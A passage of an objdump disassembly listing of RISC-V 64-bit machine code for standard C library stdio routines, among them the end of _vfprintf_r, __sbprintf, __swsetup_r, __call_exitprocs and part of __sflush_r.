   12288:	a8051663          	bnez	a0,11514 <_vfprintf_r+0xba0>
   1228c:	56ae                	lw	a3,232(sp)
   1228e:	7702                	ld	a4,32(sp)
   12290:	7792                	ld	a5,288(sp)
   12292:	835e                	mv	t1,s7
   12294:	40d706bb          	subw	a3,a4,a3
   12298:	d82ff06f          	j	1181a <_vfprintf_r+0xea6>
   1229c:	57fd                	li	a5,-1
   1229e:	e03e                	sd	a5,0(sp)
   122a0:	985fe06f          	j	10c24 <_vfprintf_r+0x2b0>
   122a4:	56c1                	li	a3,-16
   122a6:	40c00c3b          	negw	s8,a2
   122aa:	02d65f63          	bge	a2,a3,122e8 <_vfprintf_r+0x1974>
   122ae:	4d9d                	li	s11,7
   122b0:	a021                	j	122b8 <_vfprintf_r+0x1944>
   122b2:	3c41                	addiw	s8,s8,-16
   122b4:	038d5a63          	bge	s10,s8,122e8 <_vfprintf_r+0x1974>
   122b8:	2705                	addiw	a4,a4,1
   122ba:	07c1                	addi	a5,a5,16
   122bc:	01233023          	sd	s2,0(t1)
   122c0:	01a33423          	sd	s10,8(t1)
   122c4:	f23e                	sd	a5,288(sp)
   122c6:	10e12c23          	sw	a4,280(sp)
   122ca:	0341                	addi	t1,t1,16
   122cc:	feedd3e3          	bge	s11,a4,122b2 <_vfprintf_r+0x193e>
   122d0:	0a10                	addi	a2,sp,272
   122d2:	85d2                	mv	a1,s4
   122d4:	8556                	mv	a0,s5
   122d6:	45d060ef          	jal	ra,18f32 <__sprint_r>
   122da:	a2051d63          	bnez	a0,11514 <_vfprintf_r+0xba0>
   122de:	7792                	ld	a5,288(sp)
   122e0:	11812703          	lw	a4,280(sp)
   122e4:	835e                	mv	t1,s7
   122e6:	b7f1                	j	122b2 <_vfprintf_r+0x193e>
   122e8:	2705                	addiw	a4,a4,1
   122ea:	97e2                	add	a5,a5,s8
   122ec:	01233023          	sd	s2,0(t1)
   122f0:	01833423          	sd	s8,8(t1)
   122f4:	f23e                	sd	a5,288(sp)
   122f6:	10e12c23          	sw	a4,280(sp)
   122fa:	469d                	li	a3,7
   122fc:	8ae6d8e3          	bge	a3,a4,11bac <_vfprintf_r+0x1238>
   12300:	0a10                	addi	a2,sp,272
   12302:	85d2                	mv	a1,s4
   12304:	8556                	mv	a0,s5
   12306:	42d060ef          	jal	ra,18f32 <__sprint_r>
   1230a:	a0051563          	bnez	a0,11514 <_vfprintf_r+0xba0>
   1230e:	7792                	ld	a5,288(sp)
   12310:	11812703          	lw	a4,280(sp)
   12314:	835e                	mv	t1,s7
   12316:	cedfe06f          	j	11002 <_vfprintf_r+0x68e>
   1231a:	04700793          	li	a5,71
   1231e:	01dc88b3          	add	a7,s9,t4
   12322:	f0be                	sd	a5,96(sp)
   12324:	b25fe06f          	j	10e48 <_vfprintf_r+0x4d4>
   12328:	8826                	mv	a6,s1
   1232a:	accff06f          	j	115f6 <_vfprintf_r+0xc82>
   1232e:	03000793          	li	a5,48
   12332:	0ef10023          	sb	a5,224(sp)
   12336:	07800713          	li	a4,120
   1233a:	bec1                	j	11f0a <_vfprintf_r+0x1596>
   1233c:	77aa                	ld	a5,168(sp)
   1233e:	8762                	mv	a4,s8
   12340:	fdbe                	sd	a5,248(sp)
   12342:	67c6                	ld	a5,80(sp)
   12344:	fffc4683          	lbu	a3,-1(s8)
   12348:	00f7c603          	lbu	a2,15(a5)
   1234c:	00d61e63          	bne	a2,a3,12368 <_vfprintf_r+0x19f4>
   12350:	03000593          	li	a1,48
   12354:	feb70fa3          	sb	a1,-1(a4)
   12358:	776e                	ld	a4,248(sp)
   1235a:	fff70693          	addi	a3,a4,-1
   1235e:	fdb6                	sd	a3,248(sp)
   12360:	fff74683          	lbu	a3,-1(a4)
   12364:	fed608e3          	beq	a2,a3,12354 <_vfprintf_r+0x19e0>
   12368:	0016861b          	addiw	a2,a3,1
   1236c:	03900593          	li	a1,57
   12370:	0ff67613          	andi	a2,a2,255
   12374:	00b68563          	beq	a3,a1,1237e <_vfprintf_r+0x1a0a>
   12378:	fec70fa3          	sb	a2,-1(a4)
   1237c:	bb39                	j	1209a <_vfprintf_r+0x1726>
   1237e:	67c6                	ld	a5,80(sp)
   12380:	00a7c603          	lbu	a2,10(a5)
   12384:	fec70fa3          	sb	a2,-1(a4)
   12388:	bb09                	j	1209a <_vfprintf_r+0x1726>
   1238a:	001e859b          	addiw	a1,t4,1
   1238e:	8556                	mv	a0,s5
   12390:	ec1a                	sd	t1,24(sp)
   12392:	e476                	sd	t4,8(sp)
   12394:	2a2030ef          	jal	ra,15636 <_malloc_r>
   12398:	6ea2                	ld	t4,8(sp)
   1239a:	6362                	ld	t1,24(sp)
   1239c:	8caa                	mv	s9,a0
   1239e:	1e050063          	beqz	a0,1257e <_vfprintf_r+0x1c0a>
   123a2:	ec2a                	sd	a0,24(sp)
   123a4:	b641                	j	11f24 <_vfprintf_r+0x15b0>
   123a6:	000e9363          	bnez	t4,123ac <_vfprintf_r+0x1a38>
   123aa:	4e85                	li	t4,1
   123ac:	69b2                	ld	s3,264(sp)
   123ae:	1004ef93          	ori	t6,s1,256
   123b2:	6c12                	ld	s8,256(sp)
   123b4:	2f81                	sext.w	t6,t6
   123b6:	d609c1e3          	bltz	s3,12118 <_vfprintf_r+0x17a4>
   123ba:	8776                	mv	a4,t4
   123bc:	0f810893          	addi	a7,sp,248
   123c0:	0ec10813          	addi	a6,sp,236
   123c4:	11bc                	addi	a5,sp,232
   123c6:	4689                	li	a3,2
   123c8:	85e2                	mv	a1,s8
   123ca:	864e                	mv	a2,s3
   123cc:	8556                	mv	a0,s5
   123ce:	ec7e                	sd	t6,24(sp)
   123d0:	f01a                	sd	t1,32(sp)
   123d2:	e476                	sd	t4,8(sp)
   123d4:	1f0020ef          	jal	ra,145c4 <_ldtoa_r>
   123d8:	6fe2                	ld	t6,24(sp)
   123da:	ed26                	sd	s1,152(sp)
   123dc:	6ea2                	ld	t4,8(sp)
   123de:	7302                	ld	t1,32(sp)
   123e0:	8caa                	mv	s9,a0
   123e2:	84fe                	mv	s1,t6
   123e4:	ec02                	sd	zero,24(sp)
   123e6:	e582                	sd	zero,200(sp)
   123e8:	bb61                	j	12180 <_vfprintf_r+0x180c>
   123ea:	4e99                	li	t4,6
   123ec:	9fbfe06f          	j	10de6 <_vfprintf_r+0x472>
   123f0:	c31c                	sw	a5,0(a4)
   123f2:	8ca2                	mv	s9,s0
   123f4:	813fe06f          	j	10c06 <_vfprintf_r+0x292>
   123f8:	06700d93          	li	s11,103
   123fc:	77a6                	ld	a5,104(sp)
   123fe:	0ff00713          	li	a4,255
   12402:	e882                	sd	zero,80(sp)
   12404:	0007c783          	lbu	a5,0(a5)
   12408:	f082                	sd	zero,96(sp)
   1240a:	02e78863          	beq	a5,a4,1243a <_vfprintf_r+0x1ac6>
   1240e:	0ff00693          	li	a3,255
   12412:	6666                	ld	a2,88(sp)
   12414:	0007871b          	sext.w	a4,a5
   12418:	02c7d163          	bge	a5,a2,1243a <_vfprintf_r+0x1ac6>
   1241c:	75a6                	ld	a1,104(sp)
   1241e:	40e6073b          	subw	a4,a2,a4
   12422:	ecba                	sd	a4,88(sp)
   12424:	0015c783          	lbu	a5,1(a1)
   12428:	cf8d                	beqz	a5,12462 <_vfprintf_r+0x1aee>
   1242a:	7706                	ld	a4,96(sp)
   1242c:	2705                	addiw	a4,a4,1
   1242e:	f0ba                	sd	a4,96(sp)
   12430:	00158713          	addi	a4,a1,1
   12434:	f4ba                	sd	a4,104(sp)
   12436:	fcd79ee3          	bne	a5,a3,12412 <_vfprintf_r+0x1a9e>
   1243a:	7706                	ld	a4,96(sp)
   1243c:	67c6                	ld	a5,80(sp)
   1243e:	9fb9                	addw	a5,a5,a4
   12440:	672a                	ld	a4,136(sp)
   12442:	02e787bb          	mulw	a5,a5,a4
   12446:	018787bb          	addw	a5,a5,s8
   1244a:	00078c1b          	sext.w	s8,a5
   1244e:	fffc4993          	not	s3,s8
   12452:	43f9d993          	srai	s3,s3,0x3f
   12456:	0137f7b3          	and	a5,a5,s3
   1245a:	0007899b          	sext.w	s3,a5
   1245e:	b29fe06f          	j	10f86 <_vfprintf_r+0x612>
   12462:	6746                	ld	a4,80(sp)
   12464:	77a6                	ld	a5,104(sp)
   12466:	2705                	addiw	a4,a4,1
   12468:	0007c783          	lbu	a5,0(a5)
   1246c:	e8ba                	sd	a4,80(sp)
   1246e:	b7e1                	j	12436 <_vfprintf_r+0x1ac2>
   12470:	ec02                	sd	zero,24(sp)
   12472:	84be                	mv	s1,a5
   12474:	b16d                	j	1211e <_vfprintf_r+0x17aa>
   12476:	85ce                	mv	a1,s3
   12478:	8562                	mv	a0,s8
   1247a:	fc1a                	sd	t1,56(sp)
   1247c:	f876                	sd	t4,48(sp)
   1247e:	6d1090ef          	jal	ra,1c34e <__trunctfdf2>
   12482:	11a8                	addi	a0,sp,232
   12484:	23d040ef          	jal	ra,16ec0 <frexp>
   12488:	607090ef          	jal	ra,1c28e <__extenddftf2>
   1248c:	0000a797          	auipc	a5,0xa
   12490:	47478793          	addi	a5,a5,1140 # 1c900 <zeroes.4521+0x38>
   12494:	6390                	ld	a2,0(a5)
   12496:	6794                	ld	a3,8(a5)
   12498:	6f7080ef          	jal	ra,1b38e <__multf3>
   1249c:	4601                	li	a2,0
   1249e:	4681                	li	a3,0
   124a0:	f02a                	sd	a0,32(sp)
   124a2:	e42e                	sd	a1,8(sp)
   124a4:	507080ef          	jal	ra,1b1aa <__eqtf2>
   124a8:	62a2                	ld	t0,8(sp)
   124aa:	7702                	ld	a4,32(sp)
   124ac:	7ec2                	ld	t4,48(sp)
   124ae:	7362                	ld	t1,56(sp)
   124b0:	e119                	bnez	a0,124b6 <_vfprintf_r+0x1b42>
   124b2:	4785                	li	a5,1
   124b4:	d5be                	sw	a5,232(sp)
   124b6:	0000a797          	auipc	a5,0xa
   124ba:	26a78793          	addi	a5,a5,618 # 1c720 <__clzdi2+0x1a0>
   124be:	e8be                	sd	a5,80(sp)
   124c0:	bce1                	j	11f98 <_vfprintf_r+0x1624>
   124c2:	0f210713          	addi	a4,sp,242
   124c6:	e699                	bnez	a3,124d4 <_vfprintf_r+0x1b60>
   124c8:	03000713          	li	a4,48
   124cc:	0ee10923          	sb	a4,242(sp)
   124d0:	0f310713          	addi	a4,sp,243
   124d4:	0c14                	addi	a3,sp,528
   124d6:	0307879b          	addiw	a5,a5,48
   124da:	40d706b3          	sub	a3,a4,a3
   124de:	00f70023          	sb	a5,0(a4)
   124e2:	1216879b          	addiw	a5,a3,289
   124e6:	e13e                	sd	a5,128(sp)
   124e8:	a65fe06f          	j	10f4c <_vfprintf_r+0x5d8>
   124ec:	77c6                	ld	a5,112(sp)
   124ee:	06600d93          	li	s11,102
   124f2:	00e78c3b          	addw	s8,a5,a4
   124f6:	01dc0c3b          	addw	s8,s8,t4
   124fa:	bb81                	j	1224a <_vfprintf_r+0x18d6>
   124fc:	676a                	ld	a4,152(sp)
   124fe:	8b05                	andi	a4,a4,1
   12500:	e319                	bnez	a4,12506 <_vfprintf_r+0x1b92>
   12502:	a65fe06f          	j	10f66 <_vfprintf_r+0x5f2>
   12506:	a5bfe06f          	j	10f60 <_vfprintf_r+0x5ec>
   1250a:	40ec07bb          	subw	a5,s8,a4
   1250e:	2785                	addiw	a5,a5,1
   12510:	00078c1b          	sext.w	s8,a5
   12514:	fffc4993          	not	s3,s8
   12518:	43f9d993          	srai	s3,s3,0x3f
   1251c:	0137f7b3          	and	a5,a5,s3
   12520:	0007899b          	sext.w	s3,a5
   12524:	bef1                	j	12100 <_vfprintf_r+0x178c>
   12526:	e791                	bnez	a5,12532 <_vfprintf_r+0x1bbe>
   12528:	4985                	li	s3,1
   1252a:	06600d93          	li	s11,102
   1252e:	4c05                	li	s8,1
   12530:	bec1                	j	12100 <_vfprintf_r+0x178c>
   12532:	77c6                	ld	a5,112(sp)
   12534:	06600d93          	li	s11,102
   12538:	2785                	addiw	a5,a5,1
   1253a:	01d78ebb          	addw	t4,a5,t4
   1253e:	000e8c1b          	sext.w	s8,t4
   12542:	fffc4993          	not	s3,s8
   12546:	43f9d993          	srai	s3,s3,0x3f
   1254a:	013efeb3          	and	t4,t4,s3
   1254e:	000e899b          	sext.w	s3,t4
   12552:	b67d                	j	12100 <_vfprintf_r+0x178c>
   12554:	871a                	mv	a4,t1
   12556:	c9aff06f          	j	119f0 <_vfprintf_r+0x107c>
   1255a:	66c2                	ld	a3,16(sp)
   1255c:	4298                	lw	a4,0(a3)
   1255e:	06a1                	addi	a3,a3,8
   12560:	00070e9b          	sext.w	t4,a4
   12564:	00075363          	bgez	a4,1256a <_vfprintf_r+0x1bf6>
   12568:	5efd                	li	t4,-1
   1256a:	00144f03          	lbu	t5,1(s0)
   1256e:	e836                	sd	a3,16(sp)
   12570:	843e                	mv	s0,a5
   12572:	d36fe06f          	j	10aa8 <_vfprintf_r+0x134>
   12576:	4789                	li	a5,2
   12578:	e13e                	sd	a5,128(sp)
   1257a:	9d3fe06f          	j	10f4c <_vfprintf_r+0x5d8>
   1257e:	010a5783          	lhu	a5,16(s4)
   12582:	0407e793          	ori	a5,a5,64
   12586:	00fa1823          	sh	a5,16(s4)
   1258a:	e8cfe06f          	j	10c16 <_vfprintf_r+0x2a2>

000000000001258e <vfprintf>:
   1258e:	86b2                	mv	a3,a2
   12590:	862e                	mv	a2,a1
   12592:	85aa                	mv	a1,a0
   12594:	8501b503          	ld	a0,-1968(gp) # 1f5f8 <_impure_ptr>
   12598:	bdcfe06f          	j	10974 <_vfprintf_r>

000000000001259c <__sbprintf>:
   1259c:	0105d783          	lhu	a5,16(a1)
   125a0:	0ac5ae03          	lw	t3,172(a1)
   125a4:	0125d303          	lhu	t1,18(a1)
   125a8:	0305b883          	ld	a7,48(a1)
   125ac:	0405b803          	ld	a6,64(a1)
   125b0:	b3010113          	addi	sp,sp,-1232
   125b4:	9bf5                	andi	a5,a5,-3
   125b6:	40000713          	li	a4,1024
   125ba:	4c813023          	sd	s0,1216(sp)
   125be:	00f11823          	sh	a5,16(sp)
   125c2:	842e                	mv	s0,a1
   125c4:	191c                	addi	a5,sp,176
   125c6:	858a                	mv	a1,sp
   125c8:	4a913c23          	sd	s1,1208(sp)
   125cc:	4b213823          	sd	s2,1200(sp)
   125d0:	4c113423          	sd	ra,1224(sp)
   125d4:	892a                	mv	s2,a0
   125d6:	d772                	sw	t3,172(sp)
   125d8:	00611923          	sh	t1,18(sp)
   125dc:	f846                	sd	a7,48(sp)
   125de:	e0c2                	sd	a6,64(sp)
   125e0:	e03e                	sd	a5,0(sp)
   125e2:	ec3e                	sd	a5,24(sp)
   125e4:	c63a                	sw	a4,12(sp)
   125e6:	d03a                	sw	a4,32(sp)
   125e8:	d402                	sw	zero,40(sp)
   125ea:	b8afe0ef          	jal	ra,10974 <_vfprintf_r>
   125ee:	84aa                	mv	s1,a0
   125f0:	02055963          	bgez	a0,12622 <__sbprintf+0x86>
   125f4:	01015783          	lhu	a5,16(sp)
   125f8:	0407f793          	andi	a5,a5,64
   125fc:	c799                	beqz	a5,1260a <__sbprintf+0x6e>
   125fe:	01045783          	lhu	a5,16(s0)
   12602:	0407e793          	ori	a5,a5,64
   12606:	00f41823          	sh	a5,16(s0)
   1260a:	4c813083          	ld	ra,1224(sp)
   1260e:	4c013403          	ld	s0,1216(sp)
   12612:	4b013903          	ld	s2,1200(sp)
   12616:	8526                	mv	a0,s1
   12618:	4b813483          	ld	s1,1208(sp)
   1261c:	4d010113          	addi	sp,sp,1232
   12620:	8082                	ret
   12622:	858a                	mv	a1,sp
   12624:	854a                	mv	a0,s2
   12626:	354000ef          	jal	ra,1297a <_fflush_r>
   1262a:	d569                	beqz	a0,125f4 <__sbprintf+0x58>
   1262c:	54fd                	li	s1,-1
   1262e:	b7d9                	j	125f4 <__sbprintf+0x58>

0000000000012630 <__swsetup_r>:
   12630:	1101                	addi	sp,sp,-32
   12632:	e822                	sd	s0,16(sp)
   12634:	e426                	sd	s1,8(sp)
   12636:	ec06                	sd	ra,24(sp)
   12638:	8501b783          	ld	a5,-1968(gp) # 1f5f8 <_impure_ptr>
   1263c:	84aa                	mv	s1,a0
   1263e:	842e                	mv	s0,a1
   12640:	c399                	beqz	a5,12646 <__swsetup_r+0x16>
   12642:	4bb8                	lw	a4,80(a5)
   12644:	cf49                	beqz	a4,126de <__swsetup_r+0xae>
   12646:	01041703          	lh	a4,16(s0)
   1264a:	03071793          	slli	a5,a4,0x30
   1264e:	00877693          	andi	a3,a4,8
   12652:	93c1                	srli	a5,a5,0x30
   12654:	c29d                	beqz	a3,1267a <__swsetup_r+0x4a>
   12656:	6c14                	ld	a3,24(s0)
   12658:	ce9d                	beqz	a3,12696 <__swsetup_r+0x66>
   1265a:	0017f613          	andi	a2,a5,1
   1265e:	ce39                	beqz	a2,126bc <__swsetup_r+0x8c>
   12660:	5010                	lw	a2,32(s0)
   12662:	00042623          	sw	zero,12(s0)
   12666:	4501                	li	a0,0
   12668:	40c0063b          	negw	a2,a2
   1266c:	d410                	sw	a2,40(s0)
   1266e:	ceb9                	beqz	a3,126cc <__swsetup_r+0x9c>
   12670:	60e2                	ld	ra,24(sp)
   12672:	6442                	ld	s0,16(sp)
   12674:	64a2                	ld	s1,8(sp)
   12676:	6105                	addi	sp,sp,32
   12678:	8082                	ret
   1267a:	0107f693          	andi	a3,a5,16
   1267e:	cac1                	beqz	a3,1270e <__swsetup_r+0xde>
   12680:	8b91                	andi	a5,a5,4
   12682:	e3b5                	bnez	a5,126e6 <__swsetup_r+0xb6>
   12684:	6c14                	ld	a3,24(s0)
   12686:	00876713          	ori	a4,a4,8
   1268a:	03071793          	slli	a5,a4,0x30
   1268e:	00e41823          	sh	a4,16(s0)
   12692:	93c1                	srli	a5,a5,0x30
   12694:	f2f9                	bnez	a3,1265a <__swsetup_r+0x2a>
   12696:	2807f613          	andi	a2,a5,640
   1269a:	20000593          	li	a1,512
   1269e:	fab60ee3          	beq	a2,a1,1265a <__swsetup_r+0x2a>
   126a2:	85a2                	mv	a1,s0
   126a4:	8526                	mv	a0,s1
   126a6:	6d5020ef          	jal	ra,1557a <__smakebuf_r>
   126aa:	01041703          	lh	a4,16(s0)
   126ae:	6c14                	ld	a3,24(s0)
   126b0:	03071793          	slli	a5,a4,0x30
   126b4:	93c1                	srli	a5,a5,0x30
   126b6:	0017f613          	andi	a2,a5,1
   126ba:	f25d                	bnez	a2,12660 <__swsetup_r+0x30>
   126bc:	0027f613          	andi	a2,a5,2
   126c0:	4581                	li	a1,0
   126c2:	e211                	bnez	a2,126c6 <__swsetup_r+0x96>
   126c4:	500c                	lw	a1,32(s0)
   126c6:	c44c                	sw	a1,12(s0)
   126c8:	4501                	li	a0,0
   126ca:	f2dd                	bnez	a3,12670 <__swsetup_r+0x40>
   126cc:	0807f793          	andi	a5,a5,128
   126d0:	d3c5                	beqz	a5,12670 <__swsetup_r+0x40>
   126d2:	04076713          	ori	a4,a4,64
   126d6:	00e41823          	sh	a4,16(s0)
   126da:	557d                	li	a0,-1
   126dc:	bf51                	j	12670 <__swsetup_r+0x40>
   126de:	853e                	mv	a0,a5
   126e0:	530000ef          	jal	ra,12c10 <__sinit>
   126e4:	b78d                	j	12646 <__swsetup_r+0x16>
   126e6:	6c2c                	ld	a1,88(s0)
   126e8:	cd81                	beqz	a1,12700 <__swsetup_r+0xd0>
   126ea:	07440793          	addi	a5,s0,116
   126ee:	00f58763          	beq	a1,a5,126fc <__swsetup_r+0xcc>
   126f2:	8526                	mv	a0,s1
   126f4:	64e000ef          	jal	ra,12d42 <_free_r>
   126f8:	01041703          	lh	a4,16(s0)
   126fc:	04043c23          	sd	zero,88(s0)
   12700:	6c14                	ld	a3,24(s0)
   12702:	fdb77713          	andi	a4,a4,-37
   12706:	00042423          	sw	zero,8(s0)
   1270a:	e014                	sd	a3,0(s0)
   1270c:	bfad                	j	12686 <__swsetup_r+0x56>
   1270e:	47a5                	li	a5,9
   12710:	c09c                	sw	a5,0(s1)
   12712:	04076713          	ori	a4,a4,64
   12716:	00e41823          	sh	a4,16(s0)
   1271a:	557d                	li	a0,-1
   1271c:	bf91                	j	12670 <__swsetup_r+0x40>

000000000001271e <__call_exitprocs>:
   1271e:	715d                	addi	sp,sp,-80
   12720:	f052                	sd	s4,32(sp)
   12722:	8301ba03          	ld	s4,-2000(gp) # 1f5d8 <_global_impure_ptr>
   12726:	f84a                	sd	s2,48(sp)
   12728:	1f8a3903          	ld	s2,504(s4)
   1272c:	e486                	sd	ra,72(sp)
   1272e:	e0a2                	sd	s0,64(sp)
   12730:	fc26                	sd	s1,56(sp)
   12732:	f44e                	sd	s3,40(sp)
   12734:	ec56                	sd	s5,24(sp)
   12736:	e85a                	sd	s6,16(sp)
   12738:	e45e                	sd	s7,8(sp)
   1273a:	e062                	sd	s8,0(sp)
   1273c:	02090863          	beqz	s2,1276c <__call_exitprocs+0x4e>
   12740:	8b2a                	mv	s6,a0
   12742:	8bae                	mv	s7,a1
   12744:	4a85                	li	s5,1
   12746:	59fd                	li	s3,-1
   12748:	00892483          	lw	s1,8(s2)
   1274c:	fff4841b          	addiw	s0,s1,-1
   12750:	00044e63          	bltz	s0,1276c <__call_exitprocs+0x4e>
   12754:	048e                	slli	s1,s1,0x3
   12756:	94ca                	add	s1,s1,s2
   12758:	020b8663          	beqz	s7,12784 <__call_exitprocs+0x66>
   1275c:	2084b783          	ld	a5,520(s1)
   12760:	03778263          	beq	a5,s7,12784 <__call_exitprocs+0x66>
   12764:	347d                	addiw	s0,s0,-1
   12766:	14e1                	addi	s1,s1,-8
   12768:	ff3418e3          	bne	s0,s3,12758 <__call_exitprocs+0x3a>
   1276c:	60a6                	ld	ra,72(sp)
   1276e:	6406                	ld	s0,64(sp)
   12770:	74e2                	ld	s1,56(sp)
   12772:	7942                	ld	s2,48(sp)
   12774:	79a2                	ld	s3,40(sp)
   12776:	7a02                	ld	s4,32(sp)
   12778:	6ae2                	ld	s5,24(sp)
   1277a:	6b42                	ld	s6,16(sp)
   1277c:	6ba2                	ld	s7,8(sp)
   1277e:	6c02                	ld	s8,0(sp)
   12780:	6161                	addi	sp,sp,80
   12782:	8082                	ret
   12784:	00892783          	lw	a5,8(s2)
   12788:	6498                	ld	a4,8(s1)
   1278a:	37fd                	addiw	a5,a5,-1
   1278c:	04878463          	beq	a5,s0,127d4 <__call_exitprocs+0xb6>
   12790:	0004b423          	sd	zero,8(s1)
   12794:	db61                	beqz	a4,12764 <__call_exitprocs+0x46>
   12796:	31092783          	lw	a5,784(s2)
   1279a:	008a96bb          	sllw	a3,s5,s0
   1279e:	00892c03          	lw	s8,8(s2)
   127a2:	8ff5                	and	a5,a5,a3
   127a4:	2781                	sext.w	a5,a5
   127a6:	ef89                	bnez	a5,127c0 <__call_exitprocs+0xa2>
   127a8:	9702                	jalr	a4
   127aa:	00892703          	lw	a4,8(s2)
   127ae:	1f8a3783          	ld	a5,504(s4)
   127b2:	01871463          	bne	a4,s8,127ba <__call_exitprocs+0x9c>
   127b6:	faf907e3          	beq	s2,a5,12764 <__call_exitprocs+0x46>
   127ba:	dbcd                	beqz	a5,1276c <__call_exitprocs+0x4e>
   127bc:	893e                	mv	s2,a5
   127be:	b769                	j	12748 <__call_exitprocs+0x2a>
   127c0:	31492783          	lw	a5,788(s2)
   127c4:	1084b583          	ld	a1,264(s1)
   127c8:	8ff5                	and	a5,a5,a3
   127ca:	2781                	sext.w	a5,a5
   127cc:	e799                	bnez	a5,127da <__call_exitprocs+0xbc>
   127ce:	855a                	mv	a0,s6
   127d0:	9702                	jalr	a4
   127d2:	bfe1                	j	127aa <__call_exitprocs+0x8c>
   127d4:	00892423          	sw	s0,8(s2)
   127d8:	bf75                	j	12794 <__call_exitprocs+0x76>
   127da:	852e                	mv	a0,a1
   127dc:	9702                	jalr	a4
   127de:	b7f1                	j	127aa <__call_exitprocs+0x8c>

00000000000127e0 <__sflush_r>:
   127e0:	01059783          	lh	a5,16(a1)
   127e4:	7179                	addi	sp,sp,-48
   127e6:	f022                	sd	s0,32(sp)
   127e8:	e44e                	sd	s3,8(sp)
   127ea:	f406                	sd	ra,40(sp)
   127ec:	ec26                	sd	s1,24(sp)
   127ee:	e84a                	sd	s2,16(sp)
   127f0:	0087f693          	andi	a3,a5,8
   127f4:	842e                	mv	s0,a1
   127f6:	89aa                	mv	s3,a0
   127f8:	eecd                	bnez	a3,128b2 <__sflush_r+0xd2>
   127fa:	6705                	lui	a4,0x1
   127fc:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   12800:	4594                	lw	a3,8(a1)
   12802:	8fd9                	or	a5,a5,a4
   12804:	00f59823          	sh	a5,16(a1)
   12808:	10d05363          	blez	a3,1290e <__sflush_r+0x12e>
   1280c:	6438                	ld	a4,72(s0)
   1280e:	cb51                	beqz	a4,128a2 <__sflush_r+0xc2>
   12810:	0009a483          	lw	s1,0(s3)
   12814:	03079693          	slli	a3,a5,0x30
   12818:	0009a023          	sw	zero,0(s3)
   1281c:	03379613          	slli	a2,a5,0x33
   12820:	780c                	ld	a1,48(s0)
   12822:	92c1                	srli	a3,a3,0x30
   12824:	0e064963          	bltz	a2,12916 <__sflush_r+0x136>
   12828:	4601                	li	a2,0
   1282a:	4685                	li	a3,1
   1282c:	854e                	mv	a0,s3
   1282e:	9702                	jalr	a4
   12830:	57fd                	li	a5,-1
   12832:	862a                	mv	a2,a0
   12834:	10f50963          	beq	a0,a5,12946 <__sflush_r+0x166>
   12838:	01045683          	lhu	a3,16(s0)
   1283c:	6438                	ld	a4,72(s0)
   1283e:	780c                	ld	a1,48(s0)
   12840:	8a91                	andi	a3,a3,4
   12842:	c699                	beqz	a3,12850 <__sflush_r+0x70>
   12844:	4414                	lw	a3,8(s0)
   12846:	6c3c                	ld	a5,88(s0)
   12848:	8e15                	sub	a2,a2,a3
   1284a:	c399                	beqz	a5,12850 <__sflush_r+0x70>
   1284c:	583c                	lw	a5,112(s0)
   1284e:	8e1d                	sub	a2,a2,a5
   12850:	4681                	li	a3,0
   12852:	854e                	mv	a0,s3
   12854:	9702                	jalr	a4
   12856:	57fd                	li	a5,-1
   12858:	0cf51163          	bne	a0,a5,1291a <__sflush_r+0x13a>
   1285c:	0009a703          	lw	a4,0(s3)
   12860:	01041783          	lh	a5,16(s0)
   12864:	0e070f63          	beqz	a4,12962 <__sflush_r+0x182>
   12868:	46f5                	li	a3,29
   1286a:	00d70563          	beq	a4,a3,12874 <__sflush_r+0x94>
   1286e:	46d9                	li	a3,22
   12870:	0ed71f63          	bne	a4,a3,1296e <__sflush_r+0x18e>
   12874:	6c14                	ld	a3,24(s0)
   12876:	777d                	lui	a4,0xfffff
   12878:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78df>
   1287c:	8ff9                	and	a5,a5,a4
   1287e:	00f41823          	sh	a5,16(s0)
   12882:	00042423          	sw	zero,8(s0)
   12886:	e014                	sd	a3,0(s0)
   12888:	6c2c                	ld	a1,88(s0)
   1288a:	0099a023          	sw	s1,0(s3)
   1288e:	c991                	beqz	a1,128a2 <__sflush_r+0xc2>
   12890:	07440793          	addi	a5,s0,116
   12894:	00f58563          	beq	a1,a5,1289e <__sflush_r+0xbe>
   12898:	854e                	mv	a0,s3
   1289a:	4a8000ef          	jal	ra,12d42 <_free_r>
   1289e:	04043c23          	sd	zero,88(s0)
   128a2:	4501                	li	a0,0
   128a4:	70a2                	ld	ra,40(sp)
   128a6:	7402                	ld	s0,32(sp)
   128a8:	64e2                	ld	s1,24(sp)
   128aa:	6942                	ld	s2,16(sp)
   128ac:	69a2                	ld	s3,8(sp)
   128ae:	6145                	addi	sp,sp,48
   128b0:	8082                	ret
   128b2:	0185b903          	ld	s2,24(a1)
   128b6:	fe0906e3          	beqz	s2,128a2 <__sflush_r+0xc2>
   128ba:	6184                	ld	s1,0(a1)
   128bc:	03079713          	slli	a4,a5,0x30
   128c0:	9341                	srli	a4,a4,0x30
   128c2:	8b0d                	andi	a4,a4,3
   128c4:	0125b023          	sd	s2,0(a1)
   128c8:	412484bb          	subw	s1,s1,s2
   128cc:	4781                	li	a5,0
   128ce:	e311                	bnez	a4,128d2 <__sflush_r+0xf2>
   128d0:	519c                	lw	a5,32(a1)
   128d2:	c45c                	sw	a5,12(s0)
   128d4:	00904663          	bgtz	s1,128e0 <__sflush_r+0x100>
   128d8:	b7e9                	j	128a2 <__sflush_r+0xc2>
   128da:	992a                	add	s2,s2,a0
   128dc:	fc9053e3          	blez	s1,128a2 <__sflush_r+0xc2>
   128e0:	603c                	ld	a5,64(s0)
   128e2:	780c                	ld	a1,48(s0)
   128e4:	86a6                	mv	a3,s1
   128e6:	864a                	mv	a2,s2
   128e8:	854e                	mv	a0,s3
   128ea:	9782                	jalr	a5
   128ec:	9c89                	subw	s1,s1,a0
   128ee:	fea046e3          	bgtz	a0,128da <__sflush_r+0xfa>
   128f2:	01045783          	lhu	a5,16(s0)
   128f6:	70a2                	ld	ra,40(sp)
   128f8:	64e2                	ld	s1,24(sp)
   128fa:	0407e793          	ori	a5,a5,64
   128fe:	00f41823          	sh	a5,16(s0)
   12902:	7402                	ld	s0,32(sp)
   12904:	6942                	ld	s2,16(sp)
   12906:	69a2                	ld	s3,8(sp)
   12908:	557d                	li	a0,-1
   1290a:	6145                	addi	sp,sp,48
   1290c:	8082                	ret
   1290e:	59b8                	lw	a4,112(a1)
   12910:	eee04ee3          	bgtz	a4,1280c <__sflush_r+0x2c>
   12914:	b779                	j	128a2 <__sflush_r+0xc2>
   12916:	6850                	ld	a2,144(s0)
   12918:	b725                	j	12840 <__sflush_r+0x60>
   1291a:	01045783          	lhu	a5,16(s0)
